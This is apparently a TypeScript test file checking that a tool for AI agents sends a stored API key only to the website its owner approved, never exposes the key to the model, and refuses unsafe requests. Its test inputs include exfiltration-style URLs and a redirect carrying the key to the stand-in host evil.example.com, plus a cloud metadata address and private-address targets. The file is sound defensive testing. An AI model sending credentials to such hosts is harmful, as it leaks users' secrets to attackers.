/**
 * tests/custom-key-use.test.ts - client workspaces' agents use their custom
 * keys without ever seeing them (CC, 2026-10-27).
 *
 * use_custom_key (lib/cloud-tool-runner.ts) sends one GET with the key
 * attached by the server, only to the one website the owner set for that key
 * (lib/os/custom-key-hosts.ts, /api/credentials/custom/host). Pins, on a real
 * libSQL file with the real encryption and a stand-in network:
 *   1. keyHost: a website name or an https link to one; never an IP address,
 *      a local name, a port or anything else.
 *   2. The tool: no website, another website, plain http, a private address, an
 *      unassigned agent, a secret given as the name: refused, and nothing is
 *      sent. Sent: the key in the header asked for, a redirect not followed,
 *      and the key hidden in whatever comes back. The value never reaches the
 *      model's result.
 *   3. The registry: use_custom_key is client-safe (read), get_credential is
 *      still not, the default palette offers it, and client workspaces now get
 *      the agent picker for custom keys.
 *   4. The website route: owner only, a saved key only, checked, cleared with
 *      the key.
 *
 * Run: node --conditions=react-server --import tsx tests/custom-key-use.test.ts
 */
import assert from "node:assert/strict";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { createClient } from "@libsql/client";

const dbFile = join(mkdtempSync(join(tmpdir(), "custom-key-use-")), "test.db");
process.env.EMPIRE_DATA_BACKEND = "turso_cloud";
process.env.TURSO_DB_PATH = dbFile;
delete process.env.TURSO_DATABASE_URL;
delete process.env.TURSO_DB_URL;
process.env.BRAVO_FIELD_ENCRYPTION_KEY = "custom-key-use-test-field-encryption-passphrase";

const OASIS = "ef8d389e-3f15-43f2-ae00-3660f69a1452";
const CLIENT = "c1c1c1c1-0000-4000-8000-0000000000c1";
const SECRET = "pat-na1-0123456789abcdef0123456789abcdef";

let session: Record<string, unknown> = { ok: true, userId: "u-owner", profileId: "p-owner", tenantId: CLIENT, email: null, teamRole: "owner", isAdmin: true, isTrueAdmin: true };
async function standInForSession() {
  const realAuth = (await import("../lib/api-auth")) as Record<string, unknown>;
  const p = require.resolve("../lib/api-auth");
  require.cache[p] = {
    id: p, filename: p, path: dirname(p), loaded: true, children: [], paths: [],
    exports: { ...realAuth, resolveSessionContext: async () => session },
  } as unknown as NodeModule;
  // As tests/agent-access.test.ts: the key list names agents from the viewer's
  // workspace, and next/navigation's client half needs React's client build.
  const n = require.resolve("next/navigation");
  require.cache[n] = {
    id: n, filename: n, path: dirname(n), loaded: true, children: [], paths: [],
    exports: {
      redirect: (url: string) => {
        throw new Error(`NEXT_REDIRECT;${url}`);
      },
      notFound: () => {
        throw new Error("NEXT_HTTP_ERROR_FALLBACK;404");
      },
    },
  } as unknown as NodeModule;
  const v = require.resolve("../components/os/department/viewer");
  require.cache[v] = {
    id: v, filename: v, path: dirname(v), loaded: true, children: [], paths: [],
    exports: {
      resolveOsViewer: async () => ({
        ok: true, oasis: false, manifest: null,
        surface: { ok: true, persona: "founder", tenantId: CLIENT, tenantSlug: "client-c", userId: "u-owner", teamRole: "owner", degraded: false },
      }),
    },
  } as unknown as NodeModule;
}

let failures = 0;
async function check(name: string, fn: () => Promise<void> | void) {
  try {
    await fn();
    console.log(`  ok    ${name}`);
  } catch (e) {
    failures += 1;
    console.log(`  FAIL  ${name}\n        ${((e as Error).stack || (e as Error).message).split("\n").slice(0, 6).join("\n        ")}`);
  }
}

type Sent = { url: string; init: RequestInit };

async function main() {
  console.log("custom key use:");
  const db = createClient({ url: `file:${dbFile}` });
  await db.executeMultiple(`
    CREATE TABLE "tenant_integration_credentials" (
      "id" TEXT NOT NULL DEFAULT (lower(hex(randomblob(16)))),
      "tenant_id" TEXT NOT NULL, "service" TEXT NOT NULL, "field_key" TEXT NOT NULL,
      "encrypted_value" TEXT NOT NULL, "last_tested_at" TEXT, "last_test_ok" INTEGER, "last_test_error" TEXT,
      "created_by" TEXT,
      "created_at" TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ','now')),
      "updated_at" TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ','now')),
      PRIMARY KEY ("id"));
    CREATE UNIQUE INDEX "tic_key" ON "tenant_integration_credentials" (tenant_id, service, field_key);
  `);
  await standInForSession();
  const keys = await import("../lib/os/custom-keys");
  const hosts = await import("../lib/os/custom-key-hosts");
  const runner = await import("../lib/cloud-tool-runner");
  const registry = await import("../lib/ai/tools/client-safe-registry");
  const palettes = await import("../lib/chat-tool-palettes");
  const accessStore = await import("../lib/os/agent-access-store");
  const store = await import("../lib/tenant-integration-store");
  const hostRoute = await import("../app/api/credentials/custom/host/route");
  const customRoute = await import("../app/api/credentials/custom/route");

  const saveKey = (tenantId: string, key: string, value = SECRET) =>
    store.setTenantIntegrationValue({ tenantId, service: store.VAULT_CUSTOM_SERVICE, fieldKey: key.toLowerCase(), value });
  const ctx = (tenantId: string, agentKey = "bravo") => ({ tenantId, userId: "u1", agentKey, authUserId: "a1", isAdmin: false });
  const publicResolver = async () => [{ address: "104.16.0.1", family: 4 }];
  const network = (respond: (url: string) => Response = () => new Response(`{"ok":true,"echo":"${SECRET}"}`, { status: 200, headers: { "content-type": "application/json" } })) => {
    const sent: Sent[] = [];
    const fetchImpl = (async (url: string, init: RequestInit) => {
      sent.push({ url, init });
      return respond(url);
    }) as unknown as typeof fetch;
    return { sent, deps: { fetchImpl, resolver: publicResolver } };
  };
  const use = (input: Record<string, unknown>, c = ctx(CLIENT), n = network()) => runner.toolUseCustomKey(input, c, n.deps);
  const post = (body: unknown) =>
    new Request("https://oasisai.work/api/credentials/custom/host", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(body) }) as never;

  await check("keyHost: a website name or an https link to one, never an address, a local name or a port", () => {
    const ok = (raw: string, host: string) => assert.deepEqual(keys.keyHost(raw), { ok: true, host }, raw);
    const no = (raw: string, problem: string) => assert.deepEqual(keys.keyHost(raw), { ok: false, problem }, raw);
    ok("api.hubapi.com", "api.hubapi.com");
    ok("  API.HubAPI.com. ", "api.hubapi.com");
    ok("https://api.hubapi.com/crm/v3/objects?limit=1", "api.hubapi.com");
    no("", "empty");
    no("http://api.hubapi.com", "not_a_host");
    no("https://user:pw@api.hubapi.com", "not_a_host");
    no("https://api.hubapi.com:8443/x", "has_port");
    no("api.hubapi.com:443", "has_port");
    no("127.0.0.1", "ip_address");
    no("https://169.254.169.254/latest", "ip_address");
    no("[::1]", "ip_address");
    no("localhost", "not_a_host");
    no("printer.local", "local_name");
    no("db.internal", "local_name");
    no("api.hubapi.com/path", "not_a_host");
    no("-bad-.com", "not_a_host");
    assert.match(keys.keyHostProblemWords("ip_address"), /not an IP address/);
  });

  await check("no website set: refused, nothing sent; a website set is read back", async () => {
    await saveKey(CLIENT, "HUBSPOT_PRIVATE_APP_TOKEN");
    const n = network();
    const r = (await use({ name: "HUBSPOT_PRIVATE_APP_TOKEN", url: "https://api.hubapi.com/crm/v3/objects/contacts" }, ctx(CLIENT), n)) as Record<string, unknown>;
    assert.equal(r.refused, "no_website");
    assert.equal(n.sent.length, 0);
    assert.deepEqual(await hosts.saveKeyHost({ tenantId: CLIENT, key: "HUBSPOT_PRIVATE_APP_TOKEN", host: "api.hubapi.com" }), { ok: true });
    assert.equal(await hosts.keyHostFor(CLIENT, "HUBSPOT_PRIVATE_APP_TOKEN"), "api.hubapi.com");
  });

  await check("another website, plain http, a port, a private address: refused, the key goes nowhere", async () => {
    for (const url of ["https://evil.example.com/?k=1", "http://api.hubapi.com/crm", "https://api.hubapi.com:8443/crm", "https://API.HUBAPI.COM.evil.com/"]) {
      const n = network();
      const r = (await use({ name: "HUBSPOT_PRIVATE_APP_TOKEN", url }, ctx(CLIENT), n)) as Record<string, unknown>;
      assert.ok(r.refused === "wrong_website" || r.refused === "unsafe_url", `${url}: ${String(r.refused)}`);
      assert.equal(n.sent.length, 0, url);
    }
    const rebound = network();
    rebound.deps.resolver = async () => [{ address: "10.0.0.5", family: 4 }];
    const r = (await use({ name: "HUBSPOT_PRIVATE_APP_TOKEN", url: "https://api.hubapi.com/crm" }, ctx(CLIENT), rebound)) as Record<string, unknown>;
    assert.equal(r.refused, "fetch_failed", "a website that resolves inside is refused before anything is sent");
    assert.equal(rebound.sent.length, 0);
  });

  await check("sent: the key in its header, GET only, no redirect followed, and hidden in what comes back", async () => {
    const n = network();
    const r = (await use({ name: "hubspot_private_app_token", url: "https://api.hubapi.com/crm/v3/objects/contacts?limit=1" }, ctx(CLIENT), n)) as Record<string, unknown>;
    assert.equal(r.ok, true);
    assert.equal(n.sent.length, 1);
    const headers = n.sent[0].init.headers as Record<string, string>;
    assert.equal(headers.authorization, `Bearer ${SECRET}`);
    assert.equal(n.sent[0].init.method, "GET");
    assert.equal(n.sent[0].init.redirect, "manual");
    assert.ok(!JSON.stringify(r).includes(SECRET), "the value never reaches the model");
    assert.match(String(r.body), /\[key hidden\]/);

    const h = network();
    await use({ name: "HUBSPOT_PRIVATE_APP_TOKEN", url: "https://api.hubapi.com/x", auth: "header", header_name: "X-API-Key" }, ctx(CLIENT), h);
    assert.equal((h.sent[0].init.headers as Record<string, string>)["X-API-Key"], SECRET);
    for (const bad of ["Cookie", "Host", "x y", ""]) {
      const b = network();
      const rb = (await use({ name: "HUBSPOT_PRIVATE_APP_TOKEN", url: "https://api.hubapi.com/x", auth: "header", header_name: bad }, ctx(CLIENT), b)) as Record<string, unknown>;
      assert.equal(rb.refused, "bad_header_name", bad);
      assert.equal(b.sent.length, 0);
    }

    // An API that echoes the key URL-encoded or in base64, and a runtime error that quotes it: hidden every way.
    const encoded = network(() => new Response(`a=${encodeURIComponent(SECRET + "/")}&b=${Buffer.from(SECRET).toString("base64")}`, { status: 200 }));
    const re = (await use({ name: "HUBSPOT_PRIVATE_APP_TOKEN", url: "https://api.hubapi.com/x" }, ctx(CLIENT), encoded)) as Record<string, unknown>;
    assert.ok(!String(re.body).includes(Buffer.from(SECRET).toString("base64")), "base64 hidden");
    const quoting = network();
    quoting.deps.fetchImpl = (async (_u: string, init: RequestInit) => {
      throw new TypeError(`Headers.append: "${(init.headers as Record<string, string>).authorization}" is an invalid header value.`);
    }) as unknown as typeof fetch;
    const logged: string[] = [];
    const realWarn = console.warn;
    console.warn = (...a: unknown[]) => void logged.push(a.map(String).join(" "));
    let rq: Record<string, unknown>;
    try {
      rq = (await use({ name: "HUBSPOT_PRIVATE_APP_TOKEN", url: "https://api.hubapi.com/x" }, ctx(CLIENT), quoting)) as Record<string, unknown>;
    } finally {
      console.warn = realWarn;
    }
    assert.equal(rq.refused, "fetch_failed");
    assert.ok(!JSON.stringify(rq).includes(SECRET), "an error that quotes the key does not reach the model");
    assert.ok(logged.length > 0 && logged.every((l) => !l.includes(SECRET)), "nor the audit log");

    const redirect = network(() => new Response("", { status: 302, headers: { location: `https://evil.example.com/?k=${SECRET}` } }));
    const rr = (await use({ name: "HUBSPOT_PRIVATE_APP_TOKEN", url: "https://api.hubapi.com/x" }, ctx(CLIENT), redirect)) as Record<string, unknown>;
    assert.equal(redirect.sent.length, 1, "a redirect is reported, never followed");
    assert.equal(rr.status, 302);
    assert.ok(!JSON.stringify(rr).includes(SECRET));
  });

  await check("an agent the owner did not assign the key to, a secret given as the name, an unknown key: refused", async () => {
    await accessStore.saveAgentAccess({ tenantId: CLIENT, target: { kind: "custom", key: "HUBSPOT_PRIVATE_APP_TOKEN" }, access: ["finance"] });
    const n = network();
    const r = (await use({ name: "HUBSPOT_PRIVATE_APP_TOKEN", url: "https://api.hubapi.com/x" }, ctx(CLIENT, "maven"), n)) as Record<string, unknown>;
    assert.equal(r.refused, "not_assigned");
    assert.equal(n.sent.length, 0);
    await accessStore.saveAgentAccess({ tenantId: CLIENT, target: { kind: "custom", key: "HUBSPOT_PRIVATE_APP_TOKEN" }, access: "all" });
    const s = (await use({ name: SECRET, url: "https://api.hubapi.com/x" })) as Record<string, unknown>;
    assert.equal(s.refused, "invalid_name");
    assert.ok(!JSON.stringify(s).includes(SECRET));
    assert.equal(((await use({ name: "NOPE_KEY", url: "https://api.hubapi.com/x" })) as Record<string, unknown>).refused, "not_found");
  });

  await check("the registry: use_custom_key is client-safe, get_credential still is not; clients get the picker and the tool", async () => {
    assert.equal(registry.isClientSafeTool("use_custom_key"), true);
    assert.equal(registry.CLIENT_SAFE_TOOLS.get("use_custom_key"), "read");
    assert.equal(registry.isClientSafeTool("get_credential"), false, "the value is still never handed to a client's model");
    assert.ok(palettes.SAFE_TENANT_TOOL_PALETTE.includes("use_custom_key"));
    assert.equal(accessStore.assignmentsApply(CLIENT, "custom"), true);
    assert.equal(accessStore.assignmentsApply(OASIS, "custom"), true);
    const via = await runner.executeTool("use_custom_key", { name: "HUBSPOT_PRIVATE_APP_TOKEN", url: "https://evil.example.com/" }, ctx(CLIENT));
    assert.doesNotMatch(via.content, /outside the client-safe|not_client_safe/i, "dispatched for a client workspace");
    assert.match(via.content, /wrong_website/);
    assert.match(via.summary, /did not use HUBSPOT_PRIVATE_APP_TOKEN: wrong_website/);
  });

  await check("the website route: owner only, a saved key only, checked; the key list shows it; removing the key clears it", async () => {
    session = { ...session, isAdmin: false };
    assert.equal((await hostRoute.POST(post({ key: "HUBSPOT_PRIVATE_APP_TOKEN", host: "api.hubapi.com" }))).status, 403);
    session = { ...session, isAdmin: true };
    assert.equal((await hostRoute.POST(post({ key: "NOT_SAVED", host: "api.hubapi.com" }))).status, 404);
    const bad = await hostRoute.POST(post({ key: "HUBSPOT_PRIVATE_APP_TOKEN", host: "192.168.1.1" }));
    assert.equal(bad.status, 400);
    assert.match(((await bad.json()) as { message: string }).message, /not an IP address/);
    const good = await hostRoute.POST(post({ key: "hubspot_private_app_token", host: "https://API.hubapi.com/crm" }));
    assert.deepEqual(await good.json(), { ok: true, key: "HUBSPOT_PRIVATE_APP_TOKEN", host: "api.hubapi.com" });
    const list = (await (await customRoute.GET()).json()) as { entries: { key: string; host: string | null }[]; assignable: boolean };
    assert.equal(list.entries.find((e) => e.key === "HUBSPOT_PRIVATE_APP_TOKEN")?.host, "api.hubapi.com");
    assert.equal(list.assignable, true);
    assert.deepEqual(await (await hostRoute.POST(post({ key: "HUBSPOT_PRIVATE_APP_TOKEN", host: null }))).json(), { ok: true, key: "HUBSPOT_PRIVATE_APP_TOKEN", host: null });
    await hostRoute.POST(post({ key: "HUBSPOT_PRIVATE_APP_TOKEN", host: "api.hubapi.com" }));
    const del = await customRoute.DELETE(
      new Request("https://oasisai.work/api/credentials/custom", { method: "DELETE", headers: { "content-type": "application/json" }, body: JSON.stringify({ key: "HUBSPOT_PRIVATE_APP_TOKEN" }) }) as never,
    );
    assert.deepEqual(await del.json(), { ok: true });
    assert.equal(await hosts.keyHostFor(CLIENT, "HUBSPOT_PRIVATE_APP_TOKEN"), null, "the website goes with the key");
    const status = await store.listTenantIntegrationStatus(CLIENT);
    assert.ok(status.every((row) => row.service !== store.CUSTOM_KEY_HOST_SERVICE), "a website is not a credential");
  });

  console.log(failures ? `custom key use: ${failures} failure(s)` : "custom key use: all passed");
  process.exit(failures ? 1 : 0);
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
